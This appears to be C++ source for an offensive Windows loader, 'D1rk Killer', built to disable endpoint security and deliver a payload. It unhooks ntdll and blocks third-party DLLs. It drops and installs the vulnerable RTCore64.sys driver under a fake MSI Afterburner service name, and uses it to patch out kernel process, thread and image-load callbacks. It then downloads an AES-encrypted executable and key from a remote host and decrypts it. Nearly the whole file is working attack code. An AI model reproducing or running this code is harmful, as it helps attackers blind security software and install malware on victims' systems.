#include "Commun.h"

const char* d1rkkiller =
" ______   __  __    _______  _             _       _________ _        _        _______  _______\n"
"(  __  \\ (  )(  \\  (  ____ \\| \\    /\\     | \\    /\\\\__   __/( \\      ( \\      (  ____ \\(  ____ )\n"
"| (  \\  )| |  \\ \\  | (    \\/|  \\  / /     |  \\  / /   ) (   | (      | (      | (    \\/| (    )|\n"
"| |   ) || |   ) ) | (____  |  (_/ /      |  (_/ /    | |   | |      | |      | (__    | (____)|\n"
"| |   | || |  / /  |     __)|   _ (       |   _ (     | |   | |      | |      |  __)   |     __)\n"
"| |   ) || | / /   | (\\ (   |  ( \\ \\      |  ( \\ \\    | |   | |      | |      | (      | (\\ (\n"
"| (__/  )| |( /    | ) \\ \\__|  /  \\ \\     |  /  \\ \\___) (___| (____/\\| (____/\\| (____/\\| ) \\ \\__\n"
"(______/ (__)\\____/|/   \\__/|_/    \\/     |_/    \\/\\_______/(_______/(_______/(_______/|/   \\__/\n\n"
"                                                                                 By The D1rk-Group\n\n"
;




int main(int argc, char** argv) {

        if (argc != 5) {
            printf("\n%s\n\n", d1rkkiller);
            printf("[+] Usage: %s <Host> <Port> <Cipher> <Key>\n\n\n\n\n\n", argv[0]);
            return 1;
        }
        printf("\n%s\n\n", d1rkkiller);


        printf("[+] Get ntdll from Suspended notepad process\n\n");
        LPVOID my_ntdll = getNtdll();
        if (!my_ntdll) {
            printf("[-] Failed to get ntdll (%u)\n", GetLastError());
            return -1;
        }
        printf("[+] Unhook ntdll\n\n");
        if (!Unhook(my_ntdll)) {
            printf("[-] Failed to unhook ntdll (%u)\n", GetLastError());
            return -1;
        }

        /*
        printf("[+] Xoring duplicated ntdll\n\n");
        xor_data();
        */

        printf("[+] Block 3rd party DLLs\n\n");
        if (!BlockNonMSDlls()) {
            printf("[-] Failed to block 3rd party DLLs (%u)\n", GetLastError());
            return -1;
        }

        printf("[+] Block other processes to open Handle to ours\n\n");
        SetProcessSecurityDescriptor();

        //printf("[+] Drop RTCore64.sys to Disk\n\n");
        printf("[+] Drop *****.sys to Disk\n\n");
        // drop RTCore64
        wchar_t driverPath[MAX_PATH];
        ZeroMemory(driverPath, MAX_PATH);
        lstrcatW(driverPath, DropRTCore64());



        if (!driverPath) {
            printf("[-] RTCore not droped (%u)\n", GetLastError());
            return -1;
        }


        // Install Driver 
        PCWSTR  serviceName = L"RTCore64";

        PCWSTR  displayName = L"Micro-Star MSI Afterburner";


        install_driver_as_service(serviceName, displayName, driverPath + 4, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, TRUE);



        // calculating offsets

        BOOL PATCH_CALLBACKS = TRUE;

        HMODULE NToskrnl = LoadLibraryA("ntoskrnl.exe");

        const auto kernelBase = FindKernelBaseAddr();

        const DWORD64 processnotifyroutineva = kernelBase + (DWORD64(GetProcAddress(NToskrnl, "PsSetCreateProcessNotifyRoutine")) - DWORD64(NToskrnl));
        const DWORD64 threadnotifyroutineva = kernelBase + (DWORD64(GetProcAddress(NToskrnl, "PsSetCreateThreadNotifyRoutine")) - DWORD64(NToskrnl));
        const DWORD64 imagenotifyroutineva = kernelBase + (DWORD64(GetProcAddress(NToskrnl, "PsSetLoadImageNotifyRoutine")) - DWORD64(NToskrnl));



        FreeLibrary(NToskrnl);

        //Install the service
        CHAR deviceName[MAX_PATH];

        //Get the device driver list and sort it in an ascending order
        DWORD cbNeeded = 0;
        LPVOID drivers[1024];
        EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
        DWORD driverCount = sizeof(drivers) / sizeof(drivers[0]);
        LPVOID temp = NULL;
        for (int k = 0; k < driverCount; k++) {
            GetDeviceDriverBaseNameA((LPVOID)drivers[k], deviceName, sizeof(deviceName));
            BYTE firstByte = (reinterpret_cast<DWORD64>(drivers[k]) >> 56);
            if (firstByte == 0xff) {
                for (int i = 0; i < driverCount; i++) {
                    for (int j = i + 1; j < driverCount; j++) {
                        if (drivers[i] > drivers[j]) {
                            temp = drivers[i];
                            drivers[i] = drivers[j];
                            drivers[j] = temp;
                        }
                    }
                }
            }
        }


        // Removing Kernel Callbacks , and list them.
        printf("[+] Removing Kernel Callbacks\n\n");
        SearchAndPatch(processnotifyroutineva, driverCount, drivers, PATCH_CALLBACKS);
        SearchAndPatch(threadnotifyroutineva, driverCount, drivers, PATCH_CALLBACKS);
        SearchAndPatch(imagenotifyroutineva, driverCount, drivers, PATCH_CALLBACKS);



        char* host = argv[1];
        DWORD port = atoi(argv[2]);
        char* pe = argv[3];
        char* key = argv[4];

        const size_t cSize1 = strlen(host) + 1;
        wchar_t* whost = new wchar_t[cSize1];
        mbstowcs(whost, host, cSize1);


        const size_t cSize2 = strlen(pe) + 1;
        wchar_t* wpe = new wchar_t[cSize2];
        mbstowcs(wpe, pe, cSize2);

        const size_t cSize3 = strlen(key) + 1;
        wchar_t* wkey = new wchar_t[cSize3];
        mbstowcs(wkey, key, cSize3);

        

        printf("[+] Get AES Encrypted PE from %s:%d\n\n", host, port);
        DATA PE = GetData(whost, port, wpe);
        if (!PE.data) {
            printf("[-] Failed in getting AES Encrypted PE\n");
            return -1;
        }

        printf("[+] Get AES Key from %s:%d\n\n", host, port);
        DATA keyData = GetData(whost, port, wkey);
        if (!keyData.data) {
            printf("[-] Failed in getting key\n");
            return -2;
        }
        printf("[+] AES PE Address : %p\n\n", PE.data);
        printf("[+] AES Key Address : %p\n\n", keyData.data);
        
        printf("[+] Decrypt the PE \n\n");
        DecryptAES((char*)PE.data, PE.len, (char*)keyData.data, keyData.len);
        printf("[+] PE Decrypted\n\n");

        
        //}
        


    return 0;
}
